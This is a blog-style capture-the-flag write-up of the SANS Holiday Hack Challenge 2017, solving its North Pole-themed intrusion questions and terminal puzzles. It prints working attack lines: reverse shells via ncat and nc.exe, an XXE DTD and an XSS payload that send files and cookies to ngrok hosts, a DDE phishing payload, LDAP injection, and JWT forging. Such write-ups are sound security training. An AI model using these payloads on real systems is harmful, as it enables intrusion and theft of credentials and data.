---
layout: post
title: "SANS Holiday Hack Challange 2017: Writeup"
date: 2018-01-11 19:30
type: post
published: true
comments: true
categories: ctf
---

SANS hosted their yearly [Holiday Hack Challenge](https://holidayhackchallenge.com) this year as well.
It was a fun event, even though I think the story/non-hacking part was better last year.
Here is my writeup of the challenges. It's not the most thorough writeup I've done but it outlines my process of solving them.

## Questions

> 1. Visit the North Pole and Beyond at the Winter Wonder Landing Level to collect the first page of The Great Book using a giant snowball. What is the title of that page?

Play the snowball game to get the page.

**Answer:** The title of the page is "About this Book..."


> 2. Investigate the Letters to Santa application at https://l2s.northpolechristmastown.com. What is the topic of The Great Book page available in the web root of the server? What is Alabaster Snowball's password?

Look at the source code to find the link to the development site. Look at the bottom to see that it uses Apache Struts.
It's also hinted that it can be exploited through the reference to Equifax. Searching "https://www.exploit-db.com/", we find a number of explits.
Trying out a few, we find that ID 42627 works. Using it with the command `ncat -e /bin/bash mydomain.com 5000` gives us a reverse shell.
Looking at the default webroot /var/www/html we find page 2 of the great book which can be accessed through "https://l2s.northpolechristmastown.com/GreatBookPage2.pdf".
Looking in the Apache Tomcat directory we can find Alabaster Snowball's password in "/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class"

**Answer A:** The title of the page is "On the Topic of Flying Animals"  
**Answer B:** Alabaster Snowball's password is "stream_unhappy_buy_loss"  

> 3. The North Pole engineering team uses a Windows SMB server for sharing documentation and correspondence. Using your access to the Letters to Santa server, identify and enumerate the SMB file-sharing server. What is the file server share name?

Using the password we can SSH into the server and run an nmap scan for SMB through `nmap -p137-139,445 -Pn 10.142.0.0/24`
We find a suitable server at "10.142.0.7", enumerate and browser it with `smbclient -L localhost -U 'alabaster_snowball'` and `smbclient //localhost/FileStor -U alabaster_snowball stream_unhappy_buy_loss` respectively.
The files can then be downloaded.

**Answer:** The name of the share is "FileStor"  

> 4. Elf Web Access (EWA) is the preferred mailer for North Pole elves, available internally at http://mail.northpolechristmastown.com. What can you learn from The Great Book page found in an e-mail on that server?

First we set up an SSH tunnel to the mail server using the SSH access on the L2S server.
Look in the robots.txt at "mail.northpolechristmastown.com/robots.txt" to find the "/cookie.txt" file.
If we submit a cookie with a ciphertext which is exact 16 bytes long, the decrypted plaintext will be 0 bytes and always match.
Since the ciphertext is base64 encoded we need to submit a 22 (ceil(16\*4/3)) byte ciphertext for it to work.
By using the cookie `{"name":"alabaster.snowball%40northpolechristmastown.com","plaintext":"","ciphertext":"QUFBQUFBQUFBQUFBQUFBQQ"}` we can log in as Alabaster Snowball and read e-mails.

**Answer:** On the page we learn about "The Lollipop Guild"  

> 5. How many infractions are required to be marked as naughty on Santa's Naughty and Nice List? What are the names of at least six insider threat moles? Who is throwing the snowballs from the top of the North Pole Mountain and what is your proof?

In the SMB files we find a report pointing towards two moles and a link to the police department website.
Downloadning the infraction data and parsing it to csv we correleate it with the naughty list csv file found.
Ignoring the number of coals per infractions and their status we clearly see a cut off at 4 infractions where everyone at 4 or above is on the naughty list and others are not.
In the report, we find the name of two high scoring perpetrators. We assume that the other moles are high-scoring as well.  

**Answer A:** Getting 4 or more infractions puts you on the naughty list.  
**Answer B:** "Boq Questrian" and "Bini Aru" from the report. "Felix Mclean","Juanita Burgess","Manuel Graham" and "Tina Humphrey" are four other with high scores, probably moles.  
**Answer C:** The Abominable Snow Monster is throwing the snowballs as stated in the chat.

> 6. The North Pole engineering team has introduced an Elf as a Service (EaaS) platform to optimize resource allocation for mission-critical Christmas engineering projects at http://eaas.northpolechristmastown.com. Visit the system and retrieve instructions for accessing The Great Book page from C:\greatbook.txt. Then retrieve The Great Book PDF file by following those directions. What is the title of The Great Book page?

We see that we can upload an XML file to the server so let's try a XXE attack.
We can use ngrok to set up an ad-hoc web-server with `python -m SimpleHTTPServer`
We host the evil DTD file as described in the SANS article (https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities/)
The DTD file looks like this:

```
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % stolendata SYSTEM "file:///c:/greatbook.txt">
<!ENTITY % inception "<!ENTITY &#x25; sendit SYSTEM 'https://e88248eb.ngrok.io/?%stolendata;'>">
```

We then upload a payload XML containing 

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE demo [
    <!ELEMENT demo ANY >
    <!ENTITY % extentity SYSTEM "https://e88248eb.ngrok.io/evil.dtd">
    %extentity;
    %inception;
    %sendit;
    ]
<
```

Which displays the secret URI to the page in the web server log.

**Answer:** The tite of the page is "The Dreaded Inter-Dimensional Tornadoes"  

> 7. Like any other complex SCADA systems, the North Pole uses Elf-Machine Interfaces (EMI) to monitor and control critical infrastructure assets. These systems serve many uses, including email access and web browsing. Gain access to the EMI server through the use of a phishing attack with your access to the EWA server. Retrieve The Great Book page from C:\GreatBookPage7.pdf. What does The Great Book page describe?

We note that the mail hints towards Alabaster having nc.exe available.
Creating an auto dde payload document with the payload set to `DDEAUTO c:\\Windows\\System32\\cmd.exe "/k nc.exe <YOUR IP> 5000 -e cmd.exe "` and e-mailing it to Alabaster <alabaster.snowball@northpolechristmastown.com> with subject "gingerbread cookie recipe" eventually gives us a shell.
Using the reverse shell setup with `nc -lvv 5000` we can set up another reverse shell with `nc -lvv 5001 > GreatBookPage7.pdf` and then upload the document with `nc.exe <YOUR IP> < C:\GreatBookPage7.pdf`

**Answer:** The page describes the witches of Oz  

> 8. Fetch the letter to Santa from the North Pole Elf Database at http://edb.northpolechristmastown.com. Who wrote the letter?

Looking at the code, specifically the XSS protection, we can easily see that we can bypass the protection with something like `<img/src/onerror="var x=new Image;x.src='https://dfd20926.ngrok.io/'+document.cookie+'/'+localStorage.getItem('np-auth').length">`
This way we leak a JWT token which can be decoded with pyjwt into: `{"dept": "Engineering", "ou": "elf", "expires": "2017-08-16 12:00:47.248093+00:00", "uid": "alabaster.snowball"}`.
Using JohnTheRipper with a jwt2john.py script from "https://github.com/Sjord/jwtcrack" we can brute force the key in a short amount time eventually finding it to be "3lv3s".
Using this key we can forge a new token with: `pyjwt --key=3lv3s encode dept=Engineering ou=elf expires="2018-12-31 12:00:00.000000+00:00" uid=alabaster.snowball` to log in.
Browsing around we find a menu option which can only be accessed by santa so we need to forge a valid token for him.
The search is vulnerable to an LDAP injection. This can be done by providing the input `name=alab))(department=it)(|(cn=&isElf=True&attributes=profilePath%2Cgn%2Csn%2Cmail%2Cuid%2Cdepartment%2CtelephoneNumber%2Cdescription%2CuserPassword`.
This gives us a lot of data including the data to forge a token for santa with `pyjwt --key=3lv3s encode dept=administrators ou=human expires="2018-12-31 12:00:00.000000+00:00" uid=santa.claus`
Now we can access the menu option and get the letter

**Answer:** The letter was written by The Wizard of Oz  

> 9. Which character is ultimately the villain causing the giant snowball problem. What is the villain's motive?

By getting all the seven pages and playing the snowball game we eventually unlock the NPC conversation and find the villain.

**Answer:** The villain behind it all is "Glinda, the Good Witch". Her motive is to cause a war to profit from selling spells to both sides.  

## Terminal challenges

### Linux command hijacking

Look at the .bashrc to see that there are a number of nasty aliases
> cat .bashrc
```
...  
alias kill='true'  
alias killall='true'  
alias pkill='true'  
alias skill='true'  
...
```  

Remove them
> unalias -a

Find the process
> ps aux
```
...  
elf          8  0.0  0.0   4224   684 pts/0    S    01:13   0:00 /usr/bin/santaslittlehelperd  
...
```  

Kill it
> kill 8

### Candy Cane Striper

Make a copy of the binary
> cp CandyCaneStriper CandyCaneStriper2

Use perl instead of chmod to change permissions
> perl -e 'chmod 0755, "CandyCaneStriper2"'

Run the program
> ./CandyCaneStriper2

### Train Startup

Check what kind of file it is
> file trainstartup 
```
trainstartup: ELF 32-bit LSB  executable, ARM, EABI5 version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=005de4685e8563d10b3de3e0be7d6fdd7ed732eb, not stripped
```
Use Qemu to start it
> qemu-arm trainstartup

### Web log

Pick out the User-Agent field with awk, sort and count
> awk '{print $12}' access.log | sort | uniq -c
```
...
      1 "Dillo/3.0.5"
...
  97534 "Mozilla/5.0
...
      2 "curl/7.19.7
      1 "curl/7.35.0"
...
      1 "masscan/1.0
      1 "masscan/1.0"
...
```

Dillo is the least used browser, let's answer that.
> ./runtoanswer 
```
Starting up, please wait......  
Enter the name of the least popular browser in the web log: Dillo  
That is the least common browser in the web log! Congratulations!  
```

### Christmas Songs

Start SQLite with the database, list the tables and their schemas and finally join songs with likes, group them and pick the top.
> sqlite3 christmassongs.db
> .tables
> .fullschema
> SELECT songs.title, COUNT(\*) AS likes FROM likes LEFT JOIN songs ON songs.id = likes.songid GROUP BY likes.songid ORDER BY likes DESC LIMIT 0,10;
```
Stairway to Heaven|11325
```

Stairway to Heaven has the most likes, let's answer that.
> ./runtoanswer 
```
Starting up, please wait......  
Enter the name of the song with the most likes: Stairway to Heaven  
That is the #1 Christmas song, congratulations!  
```

### Shadow file

Let's see what we can run
> sudo -l 
```
Matching Defaults entries for elf on e1be9fa300cb:  
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
User elf may run the following commands on e1be9fa300cb:  
    (elf : shadow) NOPASSWD: /usr/bin/find  
```

We can run find as sudo using the group "shadow". Let's do that and use the "exec" flag of find to copy the file in place.
> sudo -g shadow find /etc -name shadow.bak -exec cp {} /etc/shadow \;

Then we can run the inspection.
> inspect_da_box

### isit42

Let's create a function called rand which always returns 42.
> echo "int rand(void){return 42;}" > derand.c  

Compile it into a shared library
> gcc -shared -o derand.so derand.c  

Use LD_PRELOAD to load the library to override libc rand with our custom implementation and win.
> LD_PRELOAD=./derand.so ./isit42  
